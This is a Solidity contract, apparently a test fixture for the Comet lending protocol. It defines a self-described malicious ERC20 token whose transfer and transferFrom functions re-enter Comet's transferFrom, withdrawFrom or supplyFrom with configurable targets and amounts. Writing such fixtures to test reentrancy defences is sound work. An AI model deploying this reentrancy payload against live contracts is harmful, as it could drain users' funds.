// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.15;

import "./../ERC20.sol";
import "./../Comet.sol";
import "./FaucetToken.sol";

/**
 * @title Malicious ERC20 token
 * @dev FaucetToken that attempts reentrancy attacks
 */
contract EvilToken is FaucetToken {
    enum AttackType {
        TRANSFER_FROM,
        WITHDRAW_FROM,
        SUPPLY_FROM
    }

    struct ReentryAttack {
        AttackType attackType;
        address source;
        address destination;
        address asset;
        uint amount;
        uint maxCalls;
    }

    ReentryAttack public attack;
    uint public numberOfCalls = 0;

    constructor(
        uint256 _initialAmount,
        string memory _tokenName,
        uint8 _decimalUnits,
        string memory _tokenSymbol
    ) FaucetToken(_initialAmount, _tokenName, _decimalUnits, _tokenSymbol) {
        attack = ReentryAttack({
            attackType: AttackType.TRANSFER_FROM,
            source: address(this),
            destination: address(this),
            asset: address(this),
            amount: 1e6,
            maxCalls: type(uint).max
        });
    }

    function getAttack() external view returns (ReentryAttack memory) {
        return attack;
    }

    function setAttack(ReentryAttack memory attack_) external {
        attack = attack_;
    }

    function transfer(address, uint256) external override returns (bool) {
        return performAttack();
    }

    function transferFrom(address, address, uint256) external override returns (bool) {
        return performAttack();
    }

    function performAttack() internal returns (bool) {
        ReentryAttack memory reentryAttack = attack;
        numberOfCalls++;
        if (numberOfCalls > reentryAttack.maxCalls) {
            // do nothing
        } else if (reentryAttack.attackType == AttackType.TRANSFER_FROM) {
            Comet(payable(msg.sender)).transferFrom(
                reentryAttack.source,
                reentryAttack.destination,
                reentryAttack.amount
            );
        } else if (reentryAttack.attackType == AttackType.WITHDRAW_FROM) {
            Comet(payable(msg.sender)).withdrawFrom(
                reentryAttack.source,
                reentryAttack.destination,
                reentryAttack.asset,
                reentryAttack.amount
            );
        } else if (reentryAttack.attackType == AttackType.SUPPLY_FROM) {
            Comet(payable(msg.sender)).supplyFrom(
                reentryAttack.source,
                reentryAttack.destination,
                reentryAttack.asset,
                reentryAttack.amount
            );
        } else {
            revert("invalid reentry attack");
        }
        return true;
    }

}